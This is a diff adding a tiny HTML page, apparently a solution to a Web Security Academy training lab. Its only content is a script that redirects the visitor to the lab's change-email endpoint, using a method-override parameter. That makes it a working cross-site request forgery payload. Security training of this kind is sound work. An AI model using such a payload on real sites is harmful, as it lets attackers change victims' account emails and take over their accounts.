@@ -1,0 +1,5 @@
+
+
+<script>
+    document.location = "https://0a8d00fe043b889f802df88f005b0022.web-security-academy.net/my-account/change-email?email=test2%40test.ca&_method=POST";
+</script>
